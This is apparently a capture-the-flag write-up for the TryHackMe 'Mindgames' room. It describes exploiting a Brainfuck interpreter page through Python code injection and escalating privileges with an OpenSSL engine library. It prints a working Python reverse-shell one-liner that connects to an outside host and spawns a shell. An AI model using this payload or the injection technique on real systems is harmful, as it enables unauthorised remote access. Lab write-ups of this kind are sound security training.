## 1. Reconnaissance:

### Checking if host alive: 

![](Attachments/THM%20Mindgames%20ping.png)

Host alive confirmed and responds to ICMP ping scan

## 2. Enumeration:

### Port scan:

![](Attachments/THM%20Mindgames%20open%20ports.png)

### Service scan:

![](Attachments/THM%20Mindgames%20service.png)

### Port 80 Directory enum:

```
```└─$ gobuster dir -u http://10.48.187.42/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

No subdirectories were found.

### HTTP page:

![](Attachments/THM%20Mindgames%20homepage.png)

Its a page that says it converts a string of characters into a message. Looking into it more, it's an esoteric programming language called "brainfuck". Attempting to copy and paste the strings for "Hello, World", i get the correct output.


## 3. Initial exploitation:

I first try XSS by converting `<script>alert("!")</script` to brainfuck using an online converter. I received this error:

![](Attachments/THM%20Mindgames.png)

Next, i try command injection `ls -la`

![](Attachments/THM%20Mindgames%20ls-la.png)

This error here is clearly a python error. Trying a python payload: `print("python for sure")`

![](Attachments/THM%20Mindgames-1.png)

It works! I can possibly use this for code injection using python. `__import__('os').system('ls -la')`

![](Attachments/THM%20Mindgamescode%20injection.png)

It works! Time to get a reverse shell. 
`__import__('os').system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.153.212",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])\'')`

![](Attachments/THM%20Mindgames%20revshell.png)

I'm in!

Exploring a little, I find the first flag in user.txt:

```
mindgames@mindgames:~$ cat user.txt
cat user.txt
thm{411f7*****}
```

## 4. Privilege Escalation:

Now, let's get linpeas.sh in here.

![](Attachments/THM%20Mindgames%20linpeas%20down.png)

After running and checking the output, I minimized the possibilities to this:

![](Attachments/THM%20Mindgames%20cap_net.png)

An OpenSSL misconfiguration. Using this as a guide (https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/openssl-privilege-escalation) I tried exploiting this.

In my attacker machine, I created `exploit.c`

![](Attachments/THM%20Mindgames%20exploit.c-1.png)

Compiled it using gcc:

![](Attachments/THM%20Mindgames-2.png)

And then downloaded it onto the target machine:

![](Attachments/THM%20Mindgames%20downloaded.png)

Finally, run it using the command
`openssl req -engine ./exploit.so`

It failed. Upon further research, it seems the failure occured as I compiled the file using ARM aarch64 while the target machine uses x86_64 architecture. One of the downsides of using an ARM Macbook :(

![](Attachments/THM%20Mindgames%20fail.png)

There is a workaround. First I installed 
```
sudo apt install gcc-x86-64-linux-gnu
```

Then I compiled it

![](Attachments/THM%20Mindgames%202%20compile.png)

And sent it over to the target and tried again

![](Attachments/THM%20Mindgames%20end.png)

IT WORKED! Heading over to /root, I get the final flag in root.txt

```
root@mindgames:/root# cat root.txt
cat root.txt
thm{1974a617**********}
```

Goodbye!!